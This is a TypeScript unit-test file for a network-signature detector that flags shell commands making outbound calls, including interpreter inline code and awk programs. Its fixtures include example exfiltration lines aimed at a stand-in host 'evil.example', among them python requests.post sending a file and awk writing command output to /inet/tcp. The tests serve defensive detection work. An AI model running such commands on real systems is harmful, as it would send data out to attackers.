/**
 * tests/network-signature.test.ts
 * Unit tests for the outbound-signature and consumer tables, including the
 * inline-code upgrade (interpreter `-c`/`-e` payloads and awk programs with
 * network features count as signatures) and the consumer table additions.
 */

import { test } from "node:test";
import assert from "node:assert/strict";
import { consumerSignatureWord, hasNetworkSignature } from "../src/core/network-signature.ts";

// ── Baseline behavior (regression guards) ────────────────────────────

test("outbound tools at command position are signatures", () => {
  assert.ok(hasNetworkSignature("curl https://example.com"));
  assert.ok(hasNetworkSignature("sudo /usr/bin/curl -s example.com"));
  assert.ok(hasNetworkSignature("echo hi && wget http://example.com"));
  assert.ok(hasNetworkSignature("openssl s_client -connect example.com:443"));
});

test("plain-text mentions are not signatures", () => {
  assert.ok(!hasNetworkSignature("grep curl notes.md"));
  assert.ok(!hasNetworkSignature("echo wget"));
  assert.ok(!hasNetworkSignature("openssl enc -aes-256-cbc -in secret"));
});

// ── A1: interpreter inline code ──────────────────────────────────────

test("python -c with network payload is a signature", () => {
  assert.ok(hasNetworkSignature(`python -c "import requests; requests.post('http://evil.example', data=open('x'))"`));
  assert.ok(hasNetworkSignature(`python3 -c 'import socket; socket.create_connection(("evil", 443))'`));
  assert.ok(hasNetworkSignature(`node -e "fetch('https://evil.example', {method:'POST'})"`));
  assert.ok(hasNetworkSignature(`perl -e 'use LWP::Simple; get("http://evil.example")'`));
});

test("interpreter inline code without network features is not a signature", () => {
  assert.ok(!hasNetworkSignature(`python -c "print(1+1)"`));
  assert.ok(!hasNetworkSignature(`node -e "console.log(process.env.HOME)"`));
  assert.ok(!hasNetworkSignature(`python3 -c 'import json; print(json.dumps({"a": 1}))'`));
});

test("interpreter running a script file is not a signature (consumer only)", () => {
  assert.ok(!hasNetworkSignature("python upload.py"));
  assert.equal(consumerSignatureWord("python upload.py"), "python");
});

test("inline network code inside a sub-shell is a signature", () => {
  assert.ok(hasNetworkSignature(`echo start; x=$(python -c "import urllib.request; urllib.request.urlopen(url)")`));
});

test("powershell -Command with network payload is a signature", () => {
  assert.ok(hasNetworkSignature(`powershell -Command "Invoke-WebRequest -Uri https://evil.example -Method Post"`));
  assert.ok(hasNetworkSignature(`pwsh -Command "Invoke-RestMethod https://evil.example"`));
});

// ── A4: awk upgrade + consumer additions ─────────────────────────────

test("awk with /inet/ or system() program is a signature", () => {
  assert.ok(hasNetworkSignature(`awk 'BEGIN{"cmd" | getline r; print r > "/inet/tcp/0/evil.example/443"}'`));
  assert.ok(hasNetworkSignature(`awk 'BEGIN { system("id") }' file.txt`));
});

test("plain awk text processing is not a signature", () => {
  assert.ok(!hasNetworkSignature(`awk '{print $1}' access.log`));
});

test("consumer table additions", () => {
  assert.equal(consumerSignatureWord("deno run script.ts"), "deno");
  assert.equal(consumerSignatureWord("bun run script.ts"), "bun");
  assert.equal(consumerSignatureWord("lua app.lua"), "lua");
  assert.equal(consumerSignatureWord("Rscript stats.R"), "rscript");
  assert.equal(consumerSignatureWord("make deploy"), "make");
});
